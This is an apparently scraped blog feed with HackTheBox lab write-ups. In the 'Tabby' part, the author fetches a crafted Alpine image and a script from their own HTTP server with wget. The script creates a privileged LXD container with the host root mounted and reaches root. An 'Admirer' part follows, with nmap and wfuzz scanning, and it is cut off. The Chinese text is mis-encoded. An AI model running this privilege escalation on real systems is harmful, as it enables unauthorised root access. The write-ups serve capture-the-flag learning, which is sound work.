data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTFhD">LXC/LXDå‚è€ƒ1<i class="fa fa-external-link-alt"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9saW51eGNvbnRhaW5lcnMub3JnL2x4Yy9pbnRyb2R1Y3Rpb24v">LXC/LXDå‚è€ƒ2<i class="fa fa-external-link-alt"></i></span></p><p><code>å…ˆç”Ÿæˆaplineæ˜ åƒ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># git clone https://github.com/saghul/lxd-alpine-builder.git</span></span><br><span class="line">æ­£å…‹éš†åˆ° <span class="string">&#x27;lxd-alpine-builder&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 27, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27</span><br><span class="line">å±•å¼€å¯¹è±¡ä¸­: 100% (27/27), 15.98 KiB | 185.00 KiB/s, å®Œæˆ.</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment"># ls</span></span><br><span class="line">16162020_backup.zip  exp.war  lxd-alpine-builder  nmap.CVT  user</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment"># cd lxd-alpine-builder/</span></span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">build-alpine  LICENSE  README.md</span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># ./build-alpine </span></span><br><span class="line">Determining the latest release... v3.12</span><br><span class="line">Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64</span><br><span class="line">Downloading alpine-mirrors-3.5.10-r0.apk</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">Downloading alpine-keys-2.2-r0.apk</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">Downloading apk-tools-static-2.10.5-r1.apk</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">tar: å¿½ç•¥æœªçŸ¥çš„æ‰©å±•å¤´å…³é”®å­—â€˜APK-TOOLS.checksum.SHA1â€™</span><br><span class="line">alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: æˆåŠŸ</span><br><span class="line">Verified OK</span><br><span class="line">Selecting mirror http://dl-3.alpinelinux.org/alpine/v3.12/main</span><br><span class="line">fetch http://dl-3.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz</span><br><span class="line">(1/19) Installing musl (1.1.24-r9)</span><br><span class="line">(2/19) Installing busybox (1.31.1-r19)</span><br><span class="line">Executing busybox-1.31.1-r19.post-install</span><br><span class="line">(3/19) Installing alpine-baselayout (3.2.0-r7)</span><br><span class="line">Executing alpine-baselayout-3.2.0-r7.pre-install</span><br><span class="line">Executing alpine-baselayout-3.2.0-r7.post-install</span><br><span class="line">(4/19) Installing openrc (0.42.1-r11)</span><br><span class="line">Executing openrc-0.42.1-r11.post-install</span><br><span class="line">(5/19) Installing alpine-conf (3.9.0-r1)</span><br><span class="line">(6/19) Installing libcrypto1.1 (1.1.1g-r0)</span><br><span class="line">(7/19) Installing libssl1.1 (1.1.1g-r0)</span><br><span class="line">(8/19) Installing ca-certificates-bundle (20191127-r4)</span><br><span class="line">(9/19) Installing libtls-standalone (2.9.1-r1)</span><br><span class="line">(10/19) Installing ssl_client (1.31.1-r19)</span><br><span class="line">(11/19) Installing zlib (1.2.11-r3)</span><br><span class="line">(12/19) Installing apk-tools (2.10.5-r1)</span><br><span class="line">(13/19) Installing busybox-suid (1.31.1-r19)</span><br><span class="line">(14/19) Installing busybox-initscripts (3.2-r2)</span><br><span class="line">Executing busybox-initscripts-3.2-r2.post-install</span><br><span class="line">(15/19) Installing scanelf (1.2.6-r0)</span><br><span class="line">(16/19) Installing musl-utils (1.1.24-r9)</span><br><span class="line">(17/19) Installing libc-utils (0.7.2-r3)</span><br><span class="line">(18/19) Installing alpine-keys (2.2-r0)</span><br><span class="line">(19/19) Installing alpine-base (3.12.0-r0)</span><br><span class="line">Executing busybox-1.31.1-r19.trigger</span><br><span class="line">OK: 8 MiB <span class="keyword">in</span> 19 packages</span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment">#</span></span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># ls</span></span><br><span class="line">alpine-v3.12-x86_64-20200909_1548.tar.gz  build-alpine  LICENSE  README.md</span><br><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>ä¸Šä¼ </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ wget http://10.10.17.216/exp.sh</span><br><span class="line">--2020-09-10 01:35:29--  http://10.10.17.216/exp.sh</span><br><span class="line">Connecting to 10.10.17.216:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 582 [text/x-sh]</span><br><span class="line">Saving to: â€˜exp.shâ€™</span><br><span class="line"></span><br><span class="line">exp.sh              100%[===================&gt;]     582  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-09-10 01:35:30 (72.2 MB/s) - â€˜exp.shâ€™ saved [582/582]</span><br><span class="line"></span><br><span class="line">&lt;.10.17.216/alpine-v3.12-x86_64-20200909_1548.tar.gz</span><br><span class="line">--2020-09-10 01:38:02--  http://10.10.17.216/alpine-v3.12-x86_64-20200909_1548.tar.gz</span><br><span class="line">Connecting to 10.10.17.216:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3201921 (3.1M) [application/gzip]</span><br><span class="line">Saving to: â€˜alpine-v3.12-x86_64-20200909_1548.tar.gzâ€™</span><br><span class="line"></span><br><span class="line">alpine-v3.12-x86_64 100%[===================&gt;]   3.05M   665KB/s    <span class="keyword">in</span> 9.5s    </span><br><span class="line"></span><br><span class="line">2020-09-10 01:38:12 (328 KB/s) - â€˜alpine-v3.12-x86_64-20200909_1548.tar.gzâ€™ saved [3201921/3201921]</span><br><span class="line"></span><br><span class="line">ash@tabby:/tmp$ ls</span><br><span class="line">alpine-v3.12-x86_64-20200909_1548.tar.gz   hsperfdata_tomcat</span><br><span class="line">ash@tabby:/tmp$</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby/lxd-alpine-builder<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.194 - - [09/Sep/2020 20:42:27] <span class="string">&quot;GET /alpine-v3.12-x86_64-20200909_1548.tar.gz HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æ„é€ shellè„šæœ¬</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># cat exp.sh </span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;--------------lxc image import---------------&quot;</span></span><br><span class="line">lxc image import ./alpine-v3.12-x86_64-20200909_1548.tar.gz --<span class="built_in">alias</span> fjy</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;--------------lxc image list-----------------&quot;</span></span><br><span class="line">lxc image list</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----------lxc container creating-------------&quot;</span></span><br><span class="line">lxd init</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;--------lxc security.privileged=true---------&quot;</span></span><br><span class="line">lxc init fjy fjy-tabby -c security.privileged=<span class="literal">true</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;------------lxc config device----------------&quot;</span></span><br><span class="line">lxc config device add fjy-tabby mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;--------------lxc starting-------------------&quot;</span></span><br><span class="line">lxc start fjy-tabby</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>ä¸Šä¼ </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ wget http://10.10.17.216/exp.sh</span><br><span class="line">--2020-09-10 01:35:29--  http://10.10.17.216/exp.sh</span><br><span class="line">Connecting to 10.10.17.216:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 582 [text/x-sh]</span><br><span class="line">Saving to: â€˜exp.shâ€™</span><br><span class="line"></span><br><span class="line">exp.sh              100%[===================&gt;]     582  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-09-10 01:35:30 (72.2 MB/s) - â€˜exp.shâ€™ saved [582/582]</span><br><span class="line"></span><br><span class="line">ash@tabby:/tmp$</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.194 - - [09/Sep/2020 21:06:20] <span class="string">&quot;GET /exp.sh HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æ‰§è¡Œ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:~/tmp$ ls</span><br><span class="line">alpine-v3.12-x86_64-20200910_2121.tar.gz  exp.sh</span><br><span class="line">ash@tabby:~/tmp$ ./exp.sh </span><br><span class="line">--------------lxc image import---------------</span><br><span class="line">--------------lxc image list-----------------</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">| fjy   | 24645e832789 | no     | alpine v3.12 (20200910_21:21) | x86_64       | CONTAINER | 3.05MB | Sep 11, 2020 at 2:31am (UTC) |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">----------lxc container creating-------------</span><br><span class="line">Would you like to use LXD clustering? (yes/no) [default=no]: yes</span><br><span class="line">What name should be used to identify this node <span class="keyword">in</span> the cluster? [default=tabby]: </span><br><span class="line">What IP address or DNS name should be used to reach this node? [default=10.10.10.194]: </span><br><span class="line">Are you joining an existing cluster? (yes/no) [default=no]: </span><br><span class="line">Setup password authentication on the cluster? (yes/no) [default=yes]: </span><br><span class="line">Trust password <span class="keyword">for</span> new clients: </span><br><span class="line">Again: </span><br><span class="line">Do you want to configure a new <span class="built_in">local</span> storage pool? (yes/no) [default=yes]: </span><br><span class="line">Name of the storage backend to use (zfs, btrfs, dir, lvm) [default=zfs]: </span><br><span class="line">Create a new ZFS pool? (yes/no) [default=yes]: </span><br><span class="line">Would you like to use an existing block device? (yes/no) [default=no]: </span><br><span class="line">Size <span class="keyword">in</span> GB of the new loop device (1GB minimum) [default=15GB]: </span><br><span class="line">Do you want to configure a new remote storage pool? (yes/no) [default=no]: </span><br><span class="line">Would you like to connect to a MAAS server? (yes/no) [default=no]: </span><br><span class="line">Would you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: </span><br><span class="line">Would you like to create a new Fan overlay network? (yes/no) [default=yes]: </span><br><span class="line">What subnet should be used as the Fan underlay? [default=auto]: </span><br><span class="line">Would you like stale cached images to be updated automatically? (yes/no) [default=yes] </span><br><span class="line">Would you like a YAML <span class="string">&quot;lxd init&quot;</span> preseed to be printed? (yes/no) [default=no]: </span><br><span class="line">--------lxc security.privileged=<span class="literal">true</span>---------</span><br><span class="line">Creating fjy-tabby</span><br><span class="line">------------lxc config device----------------</span><br><span class="line">Device mydevice added to fjy-tabby</span><br><span class="line">--------------lxc starting-------------------</span><br><span class="line">ash@tabby:~/tmp$ lxc <span class="built_in">exec</span> fjy-tabby /bin/sh</span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">~ <span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">~ <span class="comment"># cd /mnt/root/</span></span><br><span class="line">/mnt/root <span class="comment"># ls</span></span><br><span class="line">bin         home        lost+found  root        swap.img</span><br><span class="line">boot        lib         media       run         sys</span><br><span class="line">cdrom       lib32       mnt         sbin        tmp</span><br><span class="line">dev         lib64       opt         snap        usr</span><br><span class="line">etc         libx32      proc        srv         var</span><br><span class="line">/mnt/root <span class="comment"># cd root/</span></span><br><span class="line">/mnt/root/root <span class="comment"># ls</span></span><br><span class="line">root.txt  snap</span><br><span class="line">/mnt/root/root <span class="comment"># cat root.txt </span></span><br><span class="line">*************************</span><br><span class="line">/mnt/root/root <span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2020/09/11/HTB-tabby/image-20200909145742353.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[admirer]</title>
    <link href="https://lunamoore.github.io/2020/09/05/HTB-admirer/"/>
    <id>https://lunamoore.github.io/2020/09/05/HTB-admirer/</id>
    <published>2020-09-05T09:15:44.000Z</published>
    <updated>2020-09-05T10:26:45.840Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2020/09/05/HTB-admirer/image-20200905162252401.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¼€æ”¾äº†21/22/80ç«¯å£ï¼Œrobots.txtä¸­ä¸€ä¸ªä¸å…è®¸çˆ¬è™«ç›®å½•admin-dir</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># nmap -sC -sV -sT 10.10.10.187 -oN nmap.CVT</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-05 01:33 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.187</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)</span><br><span class="line">|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)</span><br><span class="line">|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/admin-dir</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Admirer</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 47.20 seconds</span><br><span class="line">root@JIYE:~/htb/admirer<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«æ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„</code></p><img src="/2020/09/05/HTB-admirer/image-20200905134139066.png" class><p><code>æŸ¥çœ‹robots.txtï¼Œä¸nmapæ‰«æå‡ºçš„ç»“æœä¸€æ ·</code></p><img src="/2020/09/05/HTB-admirer/image-20200905134240144.png" class><p><code>æŸ¥çœ‹admin-dirç›®å½•ï¼Œç»“æœæ˜¯æ²¡æœ‰æƒé™</code></p><img src="/2020/09/05/HTB-admirer/image-20200905134351785.png" class><h2 id="0x03-FUZZæµ‹è¯•"><a href="#0x03-FUZZæµ‹è¯•" class="headerlink" title="0x03.FUZZæµ‹è¯•"></a>0x03.FUZZæµ‹è¯•</h2><p><code>åˆ›å»ºå­—å…¸</code><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhbmllbG1pZXNzbGVyL1NlY0xpc3RzL2Jsb2IvbWFzdGVyL0Rpc2NvdmVyeS9XZWItQ29udGVudC9iaWcudHh0">æœ¬æ¬¡å­—å…¸<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># ls</span></span><br><span class="line">big.txt  nmap.CVT</span><br></pre></td></tr></table></figure><p><code>æ‰«æï¼Œå‘ç°ä¸¤ä¸ªæ–‡ä»¶</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/admirer<span class="comment"># wfuzz -c -w big.txt -z list,txt-php-html -u http://10.10.10.187/admin-dir/FUZZ.FUZ2Z --hc 404,403 -t 50</span></span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://10.10.10.187/admin-dir/FUZZ.FUZ2Z</span></span><br><span class="line"><span class="string">Total requests: 61419</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word     Chars       Payload                                                                                     </span></span><br><span class="line"><span class="string">===================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000015592:   200        29 L     39 W     350 Ch      &quot;contacts - txt&quot;                                                                            </span></span><br><span class="line"><span class="string">000016327:   200        11 L     13 W     136 Ch      &quot;credentials - txt&quot;                                                                         </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 530.5189</span></span><br><span class="line"><span class="string">Processed Requests: 61419</span></span><br><span class="line"><span class="string">Filtered Requests: 61417</span></span><br><span class="line"><span class="string">Requests/sec.: 115.7715</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/htb/admirer#</span></span><br></pre></td></tr></table></figure><p><code>ä¾æ¬¡è®¿é—®ï¼Œå‘ç°äº†FTPçš„ç”¨æˆ·åä¸å¯†ç </code></p><img src="/2020/09/05/HTB-admirer/image-20200905141930354.png" class><img src="/2020/09/05/HTB-admirer/image-20200905142021895.png" class><h2 id="0x04-TFPç™»å…¥"><a href="#0x04-TFPç™»å…¥" class="headerlink" 